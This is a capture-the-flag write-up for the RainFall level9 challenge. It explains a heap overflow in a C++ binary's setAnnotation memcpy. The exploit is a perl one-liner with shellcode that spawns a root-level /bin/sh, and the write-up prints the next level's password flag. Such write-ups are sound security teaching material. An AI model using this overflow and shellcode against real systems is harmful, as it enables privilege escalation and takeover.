We notice that this level is written in C++.

We also notice that beyond 108 characters, le program segfaults :

> level9@RainFall:~$ ./level9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   
> Segmentation fault (core dumped)

In fact, it is a `memcpy` function that segfaults :

>level9@RainFall:~$ ltrace ./level9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA    
> __libc_start_main(0x80485f4, 2, 0xbffff774, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330) = 0
_Znwj(108, 0xbffff774, 0xbffff780, 0xb7d79e55, 0xb7fed280) = 0x804a008
_Znwj(108, 5, 0xbffff780, 0xb7d79e55, 0xb7fed280) = 0x804a078
strlen("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...) = 109
memcpy(0x0804a00c, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 109) = 0x0804a00c
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

The `memcpy` function is called in the `setAnnotation`. Because it uses the length of the string with `strlen`, but there is no control of the size, we can overflow and cause changes to the heap.

Let's start the program while putting a breakpoint to `setAnnotation` function : 

> (gdb) disas main    
> Dump of assembler code for function main:   
   0x080485f4 <+0>:	push   %ebp   
   0x080485f5 <+1>:	mov    %esp,%ebp   
   0x080485f7 <+3>:	push   %ebx   
   0x080485f8 <+4>:	and    $0xfffffff0,%esp   
   0x080485fb <+7>:	sub    $0x20,%esp   
   0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)   
   0x08048602 <+14>:	jg     0x8048610 <main+28>   
   0x08048604 <+16>:	movl   $0x1,(%esp)   
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>   
   0x08048610 <+28>:	movl   $0x6c,(%esp)   
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>   
   0x0804861c <+40>:	mov    %eax,%ebx   
   0x0804861e <+42>:	movl   $0x5,0x4(%esp)   
   0x08048626 <+50>:	mov    %ebx,(%esp)   
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>   
   0x0804862e <+58>:	mov    %ebx,0x1c(%esp)   
   0x08048632 <+62>:	movl   $0x6c,(%esp)   
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>   
   0x0804863e <+74>:	mov    %eax,%ebx   
   0x08048640 <+76>:	movl   $0x6,0x4(%esp)   
   0x08048648 <+84>:	mov    %ebx,(%esp)   
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>   
   0x08048650 <+92>:	mov    %ebx,0x18(%esp)   
   0x08048654 <+96>:	mov    0x1c(%esp),%eax   
   0x08048658 <+100>:	mov    %eax,0x14(%esp)   
   0x0804865c <+104>:	mov    0x18(%esp),%eax   
   0x08048660 <+108>:	mov    %eax,0x10(%esp)   
   0x08048664 <+112>:	mov    0xc(%ebp),%eax   
   0x08048667 <+115>:	add    $0x4,%eax   
   0x0804866a <+118>:	mov    (%eax),%eax   
   0x0804866c <+120>:	mov    %eax,0x4(%esp)   
   0x08048670 <+124>:	mov    0x14(%esp),%eax   
   0x08048674 <+128>:	mov    %eax,(%esp)   
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAn   notationEPc>       
   0x0804867c <+136>:	mov    0x10(%esp),%eax   
   0x08048680 <+140>:	mov    (%eax),%eax   
---Type <return> to continue, or q <return> to quit---   
   0x08048682 <+142>:	mov    (%eax),%edx   
   0x08048684 <+144>:	mov    0x14(%esp),%eax   
   0x08048688 <+148>:	mov    %eax,0x4(%esp)   
   0x0804868c <+152>:	mov    0x10(%esp),%eax   
   0x08048690 <+156>:	mov    %eax,(%esp)   
   0x08048693 <+159>:	call   *%edx   
   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx   
   0x08048698 <+164>:	leave     
   0x08048699 <+165>:	ret   

> (gdb) br *0x08048677   
> Breakpoint 1 at 0x8048677

[...]

> level9@RainFall:~$ ./level9 `perl -e 'print "\x10\xa0\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80","A"x56,"\x0c\xa0\x04\x08"'`    

> $ whoami   
bonus0

> $ cat /home/user/bonus0/.pass    
>f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

# Sources : 

https://seanmurphree.com/blog/?p=157